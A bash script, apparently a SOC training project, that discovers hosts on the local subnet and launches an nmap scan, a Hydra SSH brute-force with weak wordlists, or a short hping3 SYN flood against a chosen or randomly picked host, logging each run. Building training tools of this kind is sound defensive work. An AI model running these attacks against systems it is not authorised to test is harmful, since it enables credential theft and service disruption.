#!/bin/bash
#
# CHECKER - Automated SOC Attack Training Tool
#
# Description:
#   An automated attack menu for SOC team training.
#   The administrator can list live hosts on the network, choose one of
#   several attack types (or let the script pick one at random), choose a
#   target IP (or let the script pick one at random from the detected
#   hosts), and every executed attack is logged for review.
#
# Suggested tools used: Nmap, Hydra, Hping3
#
# Credits:
#   - Network sweep technique based on standard `nmap -sn` usage,
#     https://nmap.org/book/host-discovery.html
#

LOG_FILE="/var/log/checker_project.log"

# -----------------------------------------------------------------------
# log_event: writes one line to the log file with attack type, time, and
# target IP, as required by the project spec (section 3).
# -----------------------------------------------------------------------
log_event() {
    local attack_name="$1"
    local target_ip="$2"
    local timestamp
    timestamp=$(date "+%Y-%m-%d %H:%M:%S")
    echo "[$timestamp] Attack: $attack_name | Target: $target_ip" | sudo tee -a "$LOG_FILE" > /dev/null
}

# -----------------------------------------------------------------------
# get_network_range: detects the local subnet in CIDR form so we can
# scan it for live hosts. Assumes a typical /24 LAN.
# -----------------------------------------------------------------------
get_network_range() {
    local ip
    ip=$(ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}(?=/)' | grep -v '^127\.' | head -n 1)
    if [ -z "$ip" ]; then
        echo ""
        return
    fi
    # Replace the last octet with 0/24 to build the subnet, e.g. 172.16.50.2 -> 172.16.50.0/24
    echo "$(echo "$ip" | cut -d. -f1-3).0/24"
}

# -----------------------------------------------------------------------
# list_ips: scans the local network and returns an array of live hosts.
# Uses nmap's ping scan (-sn), which does not port-scan, just discovers
# hosts that respond.
# -----------------------------------------------------------------------
declare -a DETECTED_IPS

list_ips() {
    local subnet
    subnet=$(get_network_range)
    if [ -z "$subnet" ]; then
        echo "[-] Could not detect local network range. Exiting."
        exit 1
    fi

    echo "[*] Scanning $subnet for live hosts, please wait..."
    mapfile -t DETECTED_IPS < <(nmap -sn "$subnet" -oG - | awk '/Up$/{print $2}')

    if [ "${#DETECTED_IPS[@]}" -eq 0 ]; then
        echo "[-] No live hosts found on the network. Exiting."
        exit 1
    fi

    echo "[+] Detected IP addresses on the network:"
    local i=1
    for host in "${DETECTED_IPS[@]}"; do
        echo "    $i) $host"
        i=$((i + 1))
    done
}

# -----------------------------------------------------------------------
# pick_target: lets the user type a target IP, or type "random" to pick
# one of the detected hosts at random.
# -----------------------------------------------------------------------
pick_target() {
    local target
    read -rp "Enter a target IP address (or host number 1-${#DETECTED_IPS[@]} from the list above), or type 'random': " target

    if [ "$target" == "random" ]; then
        local rand_index=$((RANDOM % ${#DETECTED_IPS[@]}))
        target="${DETECTED_IPS[$rand_index]}"
        # Printed to stderr (>&2) so it does not get captured by the
        # $(pick_target) command substitution in main(), which must only
        # receive the IP address itself.
        echo "[*] Randomly selected target: $target" >&2
    elif [[ "$target" =~ ^[0-9]+$ ]] && [ "$target" -ge 1 ] && [ "$target" -le "${#DETECTED_IPS[@]}" ]; then
        # Allow picking by the list number shown in list_ips, in case the
        # user types the index instead of the full IP address.
        target="${DETECTED_IPS[$((target - 1))]}"
        echo "[*] Selected target by list number: $target" >&2
    fi

    echo "$target"
}

# -----------------------------------------------------------------------
# ATTACK 1: Port scan with Nmap
# -----------------------------------------------------------------------
attack_nmap_scan() {
    local target="$1"
    echo "[*] Running Nmap port scan against $target ..."
    nmap -sV -T4 "$target"
    log_event "Nmap Port Scan" "$target"
}

# -----------------------------------------------------------------------
# ATTACK 2: SSH brute-force with Hydra
# Requires a wordlist. Adjust the paths below to a wordlist you have,
# e.g. /usr/share/wordlists/rockyou.txt on Kali.
# -----------------------------------------------------------------------
attack_hydra_ssh() {
    local target="$1"
    local userlist="$HOME/wordlists/users.txt"
    local passlist="$HOME/wordlists/passwords.txt"

    # Safety net: auto-create small demo wordlists if they are missing,
    # so the attack always has something to run with.
    if [ ! -f "$userlist" ]; then
        mkdir -p "$(dirname "$userlist")"
        printf "web\nadmin\nroot\n" > "$userlist"
    fi
    if [ ! -f "$passlist" ]; then
        mkdir -p "$(dirname "$passlist")"
        printf "123456\npassword\n1\nwrongpass1\n" > "$passlist"
    fi

    echo "[*] Running Hydra SSH brute-force against $target ..."
    hydra -L "$userlist" -P "$passlist" -t 4 "$target" ssh
    log_event "Hydra SSH Brute-force" "$target"
}

# -----------------------------------------------------------------------
# ATTACK 3: SYN flood simulation with Hping3
# Runs for a short, fixed count so it doesn't run forever in training.
# -----------------------------------------------------------------------
attack_hping3_flood() {
    local target="$1"
    echo "[*] Running Hping3 SYN flood simulation against $target (100 packets) ..."
    sudo hping3 -S -p 80 -c 100 --faster "$target"
    log_event "Hping3 SYN Flood" "$target"
}

# -----------------------------------------------------------------------
# Attack menu: name, description, and the function that runs it.
# -----------------------------------------------------------------------
declare -a ATTACK_NAMES=("Nmap Port Scan" "Hydra SSH Brute-force" "Hping3 SYN Flood")
declare -a ATTACK_DESCRIPTIONS=(
    "Scans the target for open ports and running services using Nmap."
    "Attempts to brute-force SSH login credentials on the target using Hydra."
    "Sends a rapid burst of TCP SYN packets to the target to simulate a flood/DoS attack using Hping3."
)
declare -a ATTACK_FUNCTIONS=("attack_nmap_scan" "attack_hydra_ssh" "attack_hping3_flood")

show_attack_menu() {
    echo
    echo "[+] Available attacks:"
    local i=1
    for name in "${ATTACK_NAMES[@]}"; do
        echo "    $i) $name - ${ATTACK_DESCRIPTIONS[$((i - 1))]}"
        i=$((i + 1))
    done
    echo "    $i) random - pick an attack at random"
}

# -----------------------------------------------------------------------
# Main program flow
# -----------------------------------------------------------------------
main() {
    echo "=================================================="
    echo "   CHECKER - Automated SOC Attack Training Tool"
    echo "=================================================="

    list_ips
    show_attack_menu

    local choice
    local random_option=$((${#ATTACK_NAMES[@]} + 1))
    read -rp "Choose an attack by number (1-${#ATTACK_NAMES[@]}), or type 'random' (or $random_option): " choice

    local attack_index
    if [ "$choice" == "random" ] || [ "$choice" == "$random_option" ]; then
        attack_index=$((RANDOM % ${#ATTACK_NAMES[@]}))
    elif [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le "${#ATTACK_NAMES[@]}" ]; then
        attack_index=$((choice - 1))
    else
        echo "[-] Invalid input. Exiting."
        exit 1
    fi

    echo "[+] Selected attack: ${ATTACK_NAMES[$attack_index]}"
    echo "[i] Attack description: ${ATTACK_DESCRIPTIONS[$attack_index]}"
    local target
    target=$(pick_target)

    if [[ ! "$target" =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]]; then
        echo "[-] Invalid target IP. Exiting."
        exit 1
    fi

    "${ATTACK_FUNCTIONS[$attack_index]}" "$target"

    echo "[+] Done. Event logged to $LOG_FILE"
}

main
